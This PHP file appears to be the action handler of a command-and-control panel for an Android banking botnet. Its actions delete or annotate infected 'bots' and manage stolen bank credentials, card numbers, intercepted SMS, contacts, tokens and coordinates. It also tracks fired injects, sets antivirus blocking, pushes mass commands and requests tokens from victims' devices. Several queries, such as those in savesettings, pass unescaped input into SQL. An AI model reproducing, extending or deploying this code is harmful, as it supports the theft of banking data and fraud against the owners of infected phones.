<?php
require_once "../dbget.php";
require '../dblayer.php';
require 'login.php';
require 'viewutils.php';
require 'news.php';
require 'statistics.php';
require 'botinfo.php';
require 'bots.php';
require 'sms.php';
require 'sms_incoming.php';
require 'sork1.php';
require 'sork.php';
require 'view.php';
require 'profile.php';
require 'apps.php';
require 'settings.php';
require 'apks.php';
require 'contacts.php';
require 'docs.php';
require 'socks.php';
require 'tokens.php';
require 'coordinates.php';


if(isset($_REQUEST['action']))
{
	$action = $_REQUEST['action'];
	if(!isset($_POST['type']))
		$_POST['type'] = '';
		
	if($action != "login")
	{
$folder = explode("/", $_SERVER['REQUEST_URI'])[1];
$json_path = "../../../clients/{$folder}/bot/client_cfg.json";
$cfg = json_decode(file_get_contents($json_path), true);
		if(isset($cfg['disabled']) && $cfg['disabled'])
		{
			setcookie("login", "", time() - 3600*24*30*12);
			setcookie("hash", "", time() - 3600*24*30*12);
			die("<meta http-equiv='refresh' content='0; url=\"login.html\"' />");
		}
	}
		
	if($action == "login")
	{
		if (isset ($_POST['login']) && isset ($_POST['password']))
		{
			db_connect();
			actionLogin($_POST['login'], $_POST['password']);
			db_free();
		}
		else echo "BAD PARAMS";
	}
	else if ($action == "getcontent")
	{
		if (isset ($_POST['view']))
		{
			$view = $_POST['view'];
			$filter = array ();
			
			if (isset ($_POST['filter'])) $filter = $_POST['filter'];
			
			if($view == 'bots' && !isset($_POST['filter']['time_connect']))
				$filter['time_connect'] = 7200;
			
			echo get_content($view, $filter);
		}
		else echo "BAD PARAMS";
	}
	else if ($action == "getfilter")
	{
		if (isset ($_POST['view']))
		{
			$view = $_POST['view'];
			$filter = array ();
			
			if (isset ($_POST['filter'])) $filter = $_POST['filter'];
			
			if($view == 'bots' && !isset($_POST['filter']['time_connect']))
				$filter['time_connect'] = 7200;

			echo get_filter($view, $filter);
		}
		else echo "BAD PARAMS";
	}
	else if ($action == "deletebot")
	{

		if(isset($_REQUEST['botids']))
		{
			db_connect();
			$bots_raw = mysql_real_escape_string($_REQUEST['botids']);
			
			$bots_raw = explode(",", $bots_raw);
			$bots = "";
			$success = 0;
			foreach($bots_raw as $b)
			{
				if(trim($b))
				{
					$bots .= "'{$b}',";
					$success++;
				}
			}

			if(!$success)
			{
				echo "BAD PARAMS";
				db_free();
				exit();
			}
				
			$bots = substr($bots, 0, strlen($bots)-1);
			
			$sqls = array();
			$sqls[] = "delete from bots where botid in({$bots})";
			
			$sqls[] = "delete from app_bl_commands where botid in({$bots})";
			$sqls[] = "delete from app_notify_commands where botid in({$bots})";
			$sqls[] = "delete from bot_apps where botid in({$bots})";
			$sqls[] = "delete from bot_card where botid in({$bots})";
			$sqls[] = "delete from bot_commerz where botid in({$bots})";
			$sqls[] = "delete from bot_commerz2 where botid in({$bots})";
			$sqls[] = "delete from bot_sms_mass where botid in({$bots})";
			$sqls[] = "delete from bot_sms_table where botid in({$bots})";
			
			$sqls[] = "delete from bots_tracking where bot_id in({$bots})";
			$sqls[] = "delete from injects_fired_tracking where bot_id in({$bots})";
			$sqls[] = "delete from sms_notify where bot_id in({$bots})";
			
			$sqls[] = "delete from general.data where bot_id in({$bots})";
			$sqls[] = "delete from general.contacts where bot_id in({$bots})";
						
			foreach($sqls as $sql)
				mysql_query($sql);
			
			echo 'OK';
			db_free();
			//~ file_put_contents('/var/www/XXX', implode("\n", $sqls));
		}
	}
	else if ($action == "setcomment")
	{
		if (isset ($_POST['botid']) && isset ($_POST['comment']))
		{                
			db_connect();

			if($_POST['type'] == 'bots') {
				echo set_comment($_POST['botid'], $_POST['comment']);
			} 
			else if ($_POST['type'] == 'cards')
			{
				echo set_comment_cards($_POST['botid'], $_POST['comment']);
			}
			else if ($_POST['type'] == 'banks')
			{
				echo set_comment_banks($_POST['botid'], $_POST['dataId'], $_POST['comment']);
			}
			else if ($_POST['type'] == 'banks2')
			{
				echo set_comment_banks2($_POST['botid'], $_POST['comment']);
			}
			else if ($_POST['type'] == 'contacts'){
				echo set_comment_contacts($_POST['botid'], $_POST['dataId'], $_POST['comment']);
			}
			else if ($_POST['type'] == 'tokens'){
				echo set_comment_tokens($_POST['dataId'], $_POST['comment']);
			}
			else if ($_POST['type'] == 'coordinates'){
				echo set_comment_coordinates($_POST['dataId'], $_POST['comment']);
			}
			else {
		echo set_comment($_POST['botid'], $_POST['comment']);
			}

			db_free();
		}
		else echo "BAD PARAMS";
	}
	elseif ($action == "setnumber")
	{
		if (isset ($_POST['botid']) && isset ($_POST['number']))
		{
			db_connect();

			if($_POST['type'] == 'bots') {
				echo set_number($_POST['botid'], $_POST['number']);
			}

			db_free();
		}
		else echo "BAD PARAMS";
	}
	else if ($action == "updatejabber"){
		
		if(isset($_POST['jabber']))
		{
			db_connect();
			update_jabber($_POST['jabber'], $_POST['login'], $_POST['pass'], $_POST['port']);
			db_free();
		}
		
	}else if ($action == "setpassword")
	{
		if (isset($_POST['pass'])
		 && isset($_POST['newpass'])
		 && isset($_POST['newpass2']))
		{
			db_connect();
			set_profile_password ($_POST['pass'],
				$_POST['newpass'], $_POST['newpass2']);
			db_free();
		}
		else echo "BAD PARAMS";
	}
	else if ($action == "regnew")
	{
		if (isset ($_POST['login'])
		 && isset ($_POST['pass']))
		{
			db_connect();
			actionRegNew ($_POST['login'], $_POST['pass']);
			db_free();
		}
	}
	else if($action == "removecard") 
	{
		db_connect();
		$bot_id = mysql_real_escape_string($_POST['botid']);
		$number = mysql_real_escape_string($_POST['number']);
		$query = "DELETE FROM `bot_card` WHERE (`botid` = '{$bot_id}') AND (`number` = '{$number}') LIMIT 1";
		$r = mysql_query($query);
		echo 'OK';
		db_free();
	}
	else if ($action == "removetoken")
	{
		db_connect();
		$id = mysql_real_escape_string($_POST['dataId']);
		$folder = explode("/", $_SERVER['REQUEST_URI'])[1];
		$json_path = "../../../clients/{$folder}/bot/client_cfg.json";
		$client_cfg = json_decode(file_get_contents($json_path), true);
		$client_id = $client_cfg['id'];
		$query = "DELETE FROM `general`.`token_data` WHERE (`id` = '{$id}') AND (`client_id` = '{$client_id}') LIMIT 1";
		$r = mysql_query($query);
		echo 'OK';
		db_free();

	}
	else if ($action == "removecoordinate")
	{
		db_connect();
		$id = mysql_real_escape_string($_POST['dataId']);
		$folder = explode("/", $_SERVER['REQUEST_URI'])[1];
		$json_path = "../../../clients/{$folder}/bot/client_cfg.json";
		$client_cfg = json_decode(file_get_contents($json_path), true);
		$client_id = $client_cfg['id'];
		if (strpos($id, ",") === false){
			$query = "DELETE FROM `general`.`coordinates_data` WHERE (`id` = '{$id}') AND (`client_id` = '{$client_id}') LIMIT 1";
		}
		else {
			$ids_in = '';
			$ids = explode(",", $id);
			$ids_len = count($ids);
			for ($i = 0; $i < $ids_len; $i++){
				$ids_in .= "'{$ids[$i]}'";
				if ($i != $ids_len-1){
					$ids_in .= ", ";
				}
			}
			$query = "DELETE FROM `general`.`coordinates_data` WHERE (`id` in ($ids_in)) AND (`client_id` = '{$client_id}')";
		}

		$r = mysql_query($query);
		echo 'OK';
		db_free();

	}
	else if($action == "removecontact") 
	{
		db_connect();
		$bot_id = mysql_real_escape_string($_POST['botid']);
		$id = mysql_real_escape_string($_POST['id']);
		//~ $client_id = (int) file_get_contents('CLIENT_ID');
$folder = explode("/", $_SERVER['REQUEST_URI'])[1];
$json_path = "../../../clients/{$folder}/bot/client_cfg.json";
$client_cfg = json_decode(file_get_contents($json_path), true);
		$client_id = $client_cfg['id'];

		$query = "DELETE FROM general.contacts WHERE `bot_id`='{$bot_id}' and `id`='{$id}' and client_id='{$client_id}' limit 1";
		
		$r = mysql_query($query);
		echo 'OK';
		db_free();
	}
	else if($action == "removebank") 
	{
		db_connect();
		$bot_id = mysql_real_escape_string($_POST['botid']);
		$id = mysql_real_escape_string($_POST['id']);
		//~ $client_id = (int) file_get_contents('CLIENT_ID');
$folder = explode("/", $_SERVER['REQUEST_URI'])[1];
$json_path = "../../../clients/{$folder}/bot/client_cfg.json";
$client_cfg = json_decode(file_get_contents($json_path), true);
		$client_id = $client_cfg['id'];

		$query = "DELETE FROM general.data WHERE `bot_id`='{$bot_id}' and `id`='{$id}' and client_id='{$client_id}' limit 1";
		
		$r = mysql_query($query);
		echo 'OK';
		db_free();
	}
	else if($action == "removebank2")
	{
		db_connect();
		$bot_id = mysql_real_escape_string($_POST['botid']);
		$id = mysql_real_escape_string($_POST['id']);
		$query = "DELETE FROM `bot_commerz2` WHERE (`botid` = '{$bot_id}') AND (`id` = '{$id}')  LIMIT 1";
		$r = mysql_query($query);
		echo 'OK';
		db_free();
	}
	else if($action == "savesettings") 
	{
		db_connect();
		$notify_json = $_POST['notify_json'];
		$notify_object = json_decode($notify_json);
		$notifications = $notify_object->notifications;

		$sent_ids = array();
		foreach ($notifications as $noty)
			$sent_ids[] = $noty->id;

		$sent_string = '('.implode(',',$sent_ids).')';
		
		$query = "DELETE FROM `settings_notify` WHERE `id` NOT IN {$sent_string}";
		$r = mysql_query($query);

		foreach ($notifications as $noty)
		{
			$q = "SELECT COUNT(*) FROM `settings_notify` WHERE id = '{$noty->id}'";
			$r = mysql_query($q);
			if ($row = mysql_fetch_row($r))
			{
				$cnt = $row[0];
				if ($cnt == 0)
				{
					$q = "INSERT INTO `settings_notify` VALUES ('{$noty->id}','{$noty->to}','{$noty->body}','{$noty->body2}')";
				}
				else
				{
					$q = "UPDATE `settings_notify` SET `to` = '{$noty->to}', `body` = '{$noty->body}', `body2` = '{$noty->body2}' WHERE `id` = '{$noty->id}'";
				}
			}
			$r = mysql_query($q);
		}


		if(
				save_settings('phones', $_POST['phones']) == 'OK' && 
				save_settings('av_block', $_POST['av_block']) == 'OK' && 
				save_settings('run_commands', $_POST['run_commands']) == 'OK' &&
				save_settings('track_bl_new', $_POST['track_bl_new']) == 'OK' &&
				save_settings('bl_command_body', $_POST['bl_command_body']) == 'OK' &&
				save_settings('notify_timeout', $_POST['notify_timeout']) == 'OK' &&
				save_settings('appmass', $_POST['appmass']) == 'OK'
			);
		echo 'OK';
		db_free();
	}
	else if($action == "appmass") 
	{
		db_connect();
		// undefined?
		bots_appmass(json_decode($_POST['bots'], true), $_POST['to']);
		db_free();
	}
	else if ($action == "request_token"){
		if (!isset($_POST['botid']) || !isset($_POST['appid'])){
			echo "";
			return;
		}
		request_token($_POST['botid'], $_POST['appid']);
	}

	else if ($action == "request_coordinates"){
		if (!isset($_POST['botid']) || !isset($_POST['appid']) || !isset($_POST['fields'])) {
			echo "";
			return;
		}
		request_coordinates($_POST['botid'], $_POST['appid'], $_POST['fields']);
	}

	else echo "";//BAD REQUEST
}
else echo "";//BAD REQUEST
